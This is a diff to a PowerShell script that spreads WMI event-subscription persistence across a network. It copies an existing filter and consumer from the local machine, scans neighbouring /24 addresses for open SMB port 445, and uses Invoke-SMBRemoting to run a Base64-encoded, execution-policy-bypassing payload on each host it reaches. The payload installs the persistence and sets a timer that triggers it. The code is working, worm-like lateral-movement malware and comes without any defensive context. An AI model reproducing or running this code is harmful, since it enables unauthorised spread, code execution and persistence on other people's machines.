@@ -96,6 +96,22 @@ function Test-Port {
     }
 }
 $scriptblock = {
+    param($Arg1, $Arg2, $Arg3, $Arg4)
+
+    $logPath = 'C:\Windows\Temp\smbremoting_args.txt'
+
+    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    $content = @(
+        "[$timestamp]"
+        "Arg1: $Arg1"
+        "Arg2: $Arg2"
+        "Arg3: $Arg3"
+        "Arg4: $Arg4"
+        "----"
+    )
+
+    $content | Out-File -FilePath $logPath -Append -Encoding UTF8
+
     function Install-Persistence{
         param(
             [string]$EventFilterName,   
@@ -124,20 +140,41 @@ $scriptblock = {
         $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
         $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"
     };
-    $thirdEventConsumerToCleanup  = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'SMB Operator'"
-    $thirdEventFilterToCleanup    = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'Check Uptime'"
-	Install-Persistence -EventFilterName $thirdEventFilterToCleanup.Name -EventConsumerName $thirdEventConsumerToCleanup.Name -Query $thirdEventFilterToCleanup.Query -finalPayload $thirdEventConsumerToCleanup.CommandLineTemplate
+	
+    Install-Persistence -EventFilterName $Arg1 -EventConsumerName $Arg2 -Query $Arg3 -finalPayload $Arg4
 
-	$timerId = "OneMinuteTimer_f71fa886-7d3f-4e66-ae34-e2dfa55f061d"
-	$dmtfTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).ToUniversalTime().AddSeconds(30))
+	$timerId = "OneMinuteTimer_f71fa886-7d3f-4e66-ae34-e2dfa66f061d"
+	$dmtfTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).ToUniversalTime().AddSeconds(10))
 	$timerClass = [wmiclass]"\\.\root\cimv2:__AbsoluteTimerInstruction"
 	$timer = $timerClass.CreateInstance()
 	$timer.TimerId = $timerId
 	$timer.EventDateTime = $dmtfTime
 	$timer.Put() | Out-Null
 }
+
+
+
+$thirdEventConsumerToCleanup  = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'Check Uptime'"
+$thirdEventFilterToCleanup    = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'SMBOperator'"
+$FilterName = $thirdEventFilterToCleanup.Name
+$ConsumerName = $thirdEventConsumerToCleanup.Name
+$Query = $thirdEventFilterToCleanup.Query
+$Command = $thirdEventConsumerToCleanup.CommandLineTemplate
+
+$cmd = @"
+`$sb = [ScriptBlock]::Create(@'
+$($scriptblock.ToString())
+'@)
+& `$sb "$FilterName" "$ConsumerName" "$Query" "$Command"
+"@
+
+$bytes   = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$encoded = [Convert]::ToBase64String($bytes)
+
+
 $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -ExpandProperty IPAddress
 foreach ($ip in $ipAddresses) {
+
     $octets = $ip.Split('.')
     $subnetPrefix = "{0}.{1}.{2}" -f $octets[0], $octets[1], $octets[2]
     $attempted = @{}
@@ -153,7 +190,9 @@ foreach ($ip in $ipAddresses) {
         if ($smb) {
             Write-Host "Attempting SMB remoting to $targetIP"
 
-            $return = Invoke-SMBRemoting -ComputerName $targetIP -Command "powershell.exe -Command { $scriptblock }"
+            $return = ""
+            Invoke-SMBRemoting -ComputerName $targetIP -Command $cmd
+
 
             if ($return -match 'timed out') {
                 continue
@@ -163,19 +202,27 @@ foreach ($ip in $ipAddresses) {
             }
         }
     }
-    for ($counter = 1; ($octets[3] + $counter) -le 254; $counter++) {
-        $lastOctet = $octets[3] + $counter
+
+    for ($counter = 1; ([int]$octets[3] + $counter) -le 254; $counter++) {
+        $lastOctet = [int]$octets[3] + $counter
         $targetIP  = "{0}.{1}" -f $subnetPrefix, $lastOctet
+
         if ($attempted.ContainsKey($targetIP)) { continue }
         $attempted[$targetIP] = $true
+
         $smb = Test-Port -IP $targetIP -Port 445
+
         if ($smb) {
+            
             Write-Host "Attempting SMB remoting to $targetIP"
-            $return = Invoke-SMBRemoting -ComputerName $targetIP -Command "powershell.exe -Command { $scriptblock }"
+
+            $return = "test"
+            Invoke-SMBRemoting -ComputerName $targetIP -Command "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encoded"
+
             if ($return -match 'timed out') {
                 continue
             } else {
-                Write-Host $return
+                #Write-Host $return
                 break
             }
         }
